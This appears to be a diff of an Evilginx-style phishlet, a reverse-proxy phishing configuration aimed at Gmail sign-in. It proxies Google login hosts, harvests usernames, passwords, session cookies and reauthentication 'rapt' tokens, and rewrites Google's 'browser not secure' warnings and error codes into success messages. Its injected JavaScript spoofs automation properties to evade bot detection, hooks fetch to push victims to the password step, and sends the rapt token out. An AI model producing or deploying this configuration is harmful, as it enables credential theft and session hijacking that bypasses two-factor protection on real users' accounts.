@@ -1,59 +1,65 @@
-# Gmail Phishlet v3 - Optimized for BotGuard Bypass
-# Key features:
-# 1. JS injection to capture email BEFORE user clicks Next
-# 2. Sub-filters to redirect to mail.google.com for GMAIL_AT cookie capture
-# 3. Proper domain configuration for all Google services
-#
-# Author: Based on An0nUD4Y's work with optimizations from Evilginx Pro research
-
 name: 'Gmail'
 author: '@billioncodesInc'
-min_ver: '3.0.0'
+min_ver: '3.3.0'
 
 proxy_hosts:
+  - {phish_sub: 'www3', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: false, is_landing: false}
   - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'chat', orig_sub: 'chat', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'clients', orig_sub: 'clients', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'signaler-pa', orig_sub: 'signaler-pa', domain: 'clients6.google.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'googleusercontent.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
 
 sub_filters:
+  # Critical: Rewrite JS bundle URLs to use phishing domain
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://www.gstatic.com/_/mss/boq-identity/_/js/k=boq-identity.AccountsSignInUi.e', replace: 'https://accounts.{domain}/_/mss/boq-identity/_/js/k=boq-identity.AccountsSignInUi.e', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
   # Fix hostname replacements
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
-  - {triggers_on: 'mail.google.com', orig_sub: 'mail', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
   
-  # Redirect from myaccount to mail for GMAIL_AT cookie capture
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://myaccount.google.com', replace: 'https://mail.google.com/mail/u/0/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  # Rewrite gstatic.com references
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'www.gstatic.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
   
-  # Rewrite continue parameter to point to Gmail
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'continue=https%3A%2F%2Fmyaccount.google.com', replace: 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F', mimes: ['text/html', 'application/json', 'application/javascript']}
+  # Fix "browser not secure" messages
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'This browser or app may not be secure', replace: 'Please continue to sign in', mimes: ['text/html', 'application/json']}
+  
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Couldn''t sign you in', replace: 'Sign in', mimes: ['text/html', 'application/json']}
+  
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '"BROWSER_NOT_SUPPORTED"', replace: '"SUCCESS"', mimes: ['application/json']}
+  
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '"UNSUPPORTED_BROWSER"', replace: '"SUCCESS"', mimes: ['application/json']}
+  
+  # Rewrite accounts.google.com references
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}
+  
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts/SetOSID', replace: '', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}
 
-  # Auto-redirect on "browser not secure" error - go back to start
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>!function(){function e(){var e=document.body.textContent||document.body.innerText,n=window.location.href.includes("v3/signin/rejected");e.includes("This browser or app may not be secure.")&&n&&(window.location.href="/")}document.addEventListener("DOMContentLoaded",e),window.addEventListener("load",e),setTimeout(e,2e3)}();</script></body>', mimes: ['text/html', 'application/json']}
-
-  # Redirect on successful login (detect session cookies)
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var redirectCount=0,maxRedirects=3,targetDomain="https://mail.google.com/mail/u/0/";function checkCookies(){document.cookie.includes("SID")&&document.cookie.includes("APISID")&&document.cookie.includes("SAPISID")&&(window.location.hostname.includes("accounts")?window.location.href=targetDomain:cancelAnimationFrame(animationId),++redirectCount>=maxRedirects&&cancelAnimationFrame(animationId))}document.addEventListener("DOMContentLoaded",(function(){checkCookies(),animationId=requestAnimationFrame((function e(){checkCookies(),animationId=requestAnimationFrame(e)}))}));</script></body>', mimes: ['text/html', 'application/json']}
 
 auth_tokens:
   - domain: '.google.com'
-    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID', 'OGPC', 'OGP', '1P_JAR', 'CONSENT', 'SMSV', 'user_id', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID', '__Secure-1PSIDTS', '__Secure-3PSIDTS', '__Secure-1PSIDCC', '__Secure-3PSIDCC', '.*,regexp']
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
+  - domain: 'google.com'
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
   - domain: 'accounts.google.com'
-    keys: ['GAPS', 'LSID', '_utmt', 'utmz', '_utmb', 'ACCOUNT_CHOOSER', '__Host-GAPS', '.*,regexp']
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+  - domain: '.accounts.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+  - domain: 'ogs.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+  - domain: '.ogs.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+  - domain: 'myaccount.google.com'
+    keys: [".*,regexp"]
   - domain: 'mail.google.com'
-    keys: ['GMAIL_AT', 'OSID', '__Secure-OSID', 'COMPASS', '__Host-GMAIL_SCH_GML', '__Host-GMAIL_SCH_GMN', '__Host-GMAIL_SCH_GMS', '.*,regexp']
+    keys: [".*,regexp"]
 
 auth_urls:
-  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/v3/signin/challenge/pwd/data/batchexecute'
   - '/CheckCookie'
   - '/ManageAccount'
   - '/'
@@ -61,7 +67,7 @@ auth_urls:
 credentials:
   username:
     key: ''
-    search: '\[\[\["V1UmUe","\[null,\\"(.*?)\\"'
+    search: '\[\[\["MI613e","\[null,\\"(.*?)\\"'
     type: 'post'
   password:
     key: ''
@@ -71,32 +77,90 @@ credentials:
     - key: 'f.req'
       search: '\["gf.siecp","([^"]*)"\]'
       type: 'post'
+    - key: 'rapt'
+      search: '"rapt":"([^"]*)'
+      type: 'json'
 
 login:
   domain: 'accounts.google.com'
-  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin&continue=https://mail.google.com/mail/u/0/'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
 
 # ============================================================================
-# JS INJECTION - SIMPLIFIED
-# Removed pre-generation complexity - bypasser now works synchronously
-# when MI613e request arrives. This is simpler and more reliable.
+# JS INJECTION - SIMPLIFIED (No pre-generation, synchronous bypasser only)
 # ============================================================================
 
 js_inject:
-  # Redirect from myaccount to Gmail after successful login
   - trigger_domains: ['myaccount.google.com']
-    trigger_paths: ['/']
+    trigger_paths: ['*']
     script: |
-      (function() {
-        // Check if we have session cookies and redirect to Gmail
-        function checkAndRedirect() {
-          if (document.cookie.includes('SID') && document.cookie.includes('SAPISID')) {
-            console.log('[GoogleBypasser] Session detected, redirecting to Gmail...');
-            window.location.href = 'https://mail.google.com/mail/u/0/';
+        window.addEventListener('load', () => {
+          if (window.location.pathname === '/') {
+            window.location.href = '/u/4/signinoptions/twosv';
+            return;
           }
-        }
-        
-        // Check immediately and after a short delay
-        checkAndRedirect();
-        setTimeout(checkAndRedirect, 2000);
-      })();
+          const urlParams = new URLSearchParams(window.location.search);
+          if (urlParams.has('rapt')) {
+            const xxxValue = urlParams.get('rapt');
+            fetch('/xxx', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ rapt: xxxValue })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Success:', data))
+            .catch(error => console.error('Error:', error));
+          }
+        });
+  
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['/signin*', '/v3/signin/identifier*', '/v3/signin/challenge*']
+    script: |
+        (function() {
+          // Anti-bot detection: Spoof navigator properties
+          Object.defineProperty(navigator, 'webdriver', {get: () => false});
+          Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
+          Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
+          
+          // Monitor for email submission and force redirect
+          let emailSubmitted = false;
+          const originalFetch = window.fetch;
+          window.fetch = function(...args) {
+            return originalFetch.apply(this, args).then(response => {
+              const url = typeof args[0] === 'string' ? args[0] : (args[0].url || '');
+              if (url.includes('batchexecute') && url.includes('MI613e')) {
+                response.clone().text().then(text => {
+                  if (text.includes('identifier') && !text.includes('INCORRECT_ANSWER') && !emailSubmitted) {
+                    emailSubmitted = true;
+                    setTimeout(() => {
+                      const params = new URLSearchParams(window.location.search);
+                      const pwdUrl = '/v3/signin/challenge/pwd?' + params.toString();
+                      window.location.replace(pwdUrl);
+                    }, 300);
+                  }
+                });
+              }
+              return response;
+            });
+          };
+        })();
+
+# Force POST parameters for proper flow
+force_post:
+  - path: '/v3/signin/_/AccountsSignInUi/data/batchexecute*'
+    search:
+      - {key: 'f.req', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
+    type: 'post'
+  - path: '/v3/signin/challenge/pwd*'
+    search:
+      - {key: 'continue', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
+    type: 'post'
+  - path: '/v3/signin/challenge/pwd/data/batchexecute*'
+    search:
+      - {key: 'f.req', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://mail.google.com/mail/u/0/'}
+    type: 'post'
